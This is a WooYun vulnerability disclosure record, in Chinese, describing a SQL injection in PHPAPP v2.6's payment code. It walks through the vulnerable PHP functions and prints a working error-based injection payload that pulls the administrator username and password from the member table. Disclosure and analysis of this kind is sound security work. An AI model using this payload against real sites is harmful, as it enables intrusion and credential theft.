{"id": 41422, "wybug_id": "wooyun-2014-088867", "wybug_title": "PHPAPP注入第八枚（无视过滤）", "wybug_corp": "PHPAPP", "wybug_author": "路人甲", "wybug_date": "2014-12-29 18:21", "wybug_open_date": "2015-03-29 18:22", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPAPP注入第八枚（无视过滤） 详细说明：  在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/index.php?action=5&app=5, 存在漏洞的文件在/phpapp/apps/apppay/main_phpapp.php来看看漏洞是如何产生的/phpapp/apps/apppay/main_phpapp.php\nfunction OnLinePayAction(){\t\t\t\t\t\t if($this->POST['PayMoney'] < PHPAPP::$config['pay_small_money']){\t\t\t \t\t\t    $this->Refresh(include $this->LanguageArray('apppay','Pay_is_too_low',1),'member.php?app=5&action=2');\t\t\t \t\t }else{\t\t \t\t\t   include_once(APPS.'/pay/main_phpapp.php');\t  \t\t\t   $pay=new PayMainControls();\t\t\t\t\t\t   \t\t\t   $pay->GoPayTool($this->POST);\t\t\t   \t\t }\t}\n调用了GoPayTool方法，去看看GoPayTool\nfunction GoPayTool($payarr){\t\t\t//检查支付工具\t\t$paytoolid=$payarr['PayToolID'];\t\tif($this->IsSQL('pay_tool',\"WHERE id_phpapp='$paytoolid'\")){\t\t\t if($payarr['Submit']){\t\t\t   \t\t\t      include_once(APPS.'/pay/class/pay_class_phpapp.php');\t\t          $pay=new PayMoney($payarr,$paytoolid);\t\t\t\t\t\t      $pay->SetPayTools();\t\t\t\t\t\t }\t\t\t\t\t}else{\t\t\t  header('location:'.SURL);\t\t}\t}\n$payarr['PayToolID']即$this->POST['PayToolID'],而$this->POST是通过$_POST过滤结尾的’_s’的参数到得的，这里的因为结尾不是’_s’，所以不会被过滤，造成了注入。Phpapp可以显错，那就用error-based blind进行注入。Pyload：(POST提交)\nPayMoney=1&PayToolID=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(0x23,username,0x23,password) from phpapp_member limit 0,1))a from phpapp_member group by a)b) or '\n注入成功，管理员用户名及密码如下图中所示：\n\n   漏洞证明：  见 详细说明   修复方案：  $this->str()   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}